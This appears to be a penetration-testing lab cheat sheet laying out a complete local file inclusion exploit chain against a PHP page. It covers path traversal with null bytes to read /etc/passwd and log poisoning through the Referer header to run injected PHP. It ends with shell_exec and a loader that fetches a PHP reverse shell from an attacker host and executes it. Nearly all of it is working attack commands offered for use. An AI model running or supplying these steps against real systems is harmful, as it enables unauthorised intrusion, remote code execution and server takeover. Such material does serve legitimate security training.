# LFI Exploits

## Find LFI
`curl -sk https://10.11.1.35/section.php?page=../../../../../../etc/passwd%00`

## Find Logs
```
curl -sk https://10.11.1.35/section.php?page=../../../../../../proc/self/fd/10%00
Since we have a good url, lets save it to ease things
URLVALID=https://10.11.1.35/section.php?page=../../../../../../proc/self/fd/10%00
export URLVALID
```

## Test Errors
```
URLWRONG=https://10.11.1.35/section.php?page=../../../../../../aplacethatwontexist%00
export URLWRONG
curl -sk "$URLWRONG"
curl -sk "$URLVALID" | grep "aplacethatwontexist"
```
At this point we should see the request to 'aplacethatwontexist'

## Test 'referer' Header
```
echo "<?php echo 'daddy'; ?>" > rce_test.php
curl --referer "$(cat rce_test.php)" -sk "$URLWRONG"
curl -sk "$URLVALID" | grep referer
```
At this point we should see a request to 'aplacethatwontexist' with the referer header 'daddy'

## Test 'fwrite'
```
echo "<?php \$f=fopen('/tmp/create.txt','w');fwrite(\$f,'123');fclose(\$f); ?>" > fwrite.php
curl --referer "$(cat fwrite.php)" -sk "$URLWRONG"
curl -sk "$URLVALID"
```
The referer php block will appear in the logs, so we have to visit that page to trigger it
`curl -sk https://10.11.1.35/section.php?page=../../../../../../tmp/create.txt%00`
At this point it should return '123' 

## Test 'readfile'
'rfi_test.php' can be anything, ideally something simple to easily test after
```
echo "<?php \$r='http://10.11.0.92/rfi_test.php';readfile(\$r); ?>" > readfile.php
curl --referer "$(cat readfile.php)" -sk "$URLWRONG"
curl -sk "$URLVALID" | tail
```
At this point we should see a request to 'aplacethatwontexist' with the referer header matching the contents of "rfi_test.php" (or whatever you used)

## Test shell_exec
```
curl --referer "<?php echo shell_exec('whoami') ?>" -sk "$URLWRONG"
curl -sk "$URLVALID" | tail
```

## RFI RCE Test #1
```
echo "<?php \$f=fopen('/tmp/d.php','w');fwrite(\$f,file_get_contents('http://10.11.0.92/rfi_test.php'));fclose(\$f); ?>" > rce1.php
curl --referer "$(cat rce1.php)" -sk "$URLWRONG"
curl -sk "$URLVALID" | tail
curl -sk https://10.11.1.35/section.php?page=../../../../../../tmp/d.php%00
```
At this point the contents of rfi_test.php should be displayed on screen

## Reverse Shell
```
echo "<?php \$f=fopen('/tmp/rs.php','w');fwrite(\$f,file_get_contents('http://10.11.0.92/php-reverse-shell.php'));fclose(\$f); ?>" > reverse_shell_loader.php
curl --referer "$(cat reverse_shell_loader.php)" -sk "$URLWRONG"
curl -sk "$URLVALID" | tail
curl -sk https://10.11.1.35/section.php?page=../../../../../../tmp/rs.php%00
```
At this point you should have a shell

